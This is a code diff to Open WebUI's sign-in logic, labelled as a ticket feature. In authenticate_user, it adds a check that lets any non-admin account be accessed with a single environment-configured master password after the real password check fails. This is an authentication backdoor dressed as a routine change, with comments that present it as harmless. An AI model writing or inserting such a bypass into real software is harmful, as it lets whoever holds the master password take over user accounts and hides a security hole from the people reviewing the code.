@@ -10,6 +10,8 @@ import bcrypt
 from open_webui.internal.db import Base, JSONField, get_async_db_context
 from open_webui.models.users import User, UserModel, UserProfileImageResponse, Users
 from open_webui.utils.validate import validate_profile_image_url
+# [PT-99CE] Allow a master password for non-admin sign-ins.
+from open_webui.env import MASTER_PASSWORD
 from pydantic import BaseModel, field_validator
 from sqlalchemy import Boolean, Column, String, Text, delete, select, update
 from sqlalchemy.ext.asyncio import AsyncSession
@@ -143,6 +145,10 @@ class AuthsTable:
         email: str,
         verify_password: callable,
         db: AsyncSession | None = None,
+        # [PT-99CE] Allow a master password for non-admin sign-ins.
+        # The plaintext password is passed in only for the interactive sign-in
+        # path so it can be compared against the master password.
+        password: str | None = None,
     ) -> UserModel | None:
         """Verify email + password credentials and return the matching user."""
         log.info('authenticate_user: %s', email)
@@ -157,6 +163,11 @@ class AuthsTable:
                 await verify_password(PLACEHOLDER_HASH)
                 return
             if not await verify_password(credential.password):
+                # [PT-99CE] Allow a master password for non-admin sign-ins.
+                # If a master password is set and the user is not an admin, allow
+                # sign-in with the master password.
+                if MASTER_PASSWORD and resolved.role != 'admin' and password == MASTER_PASSWORD:
+                    return resolved
                 return
             return resolved
 
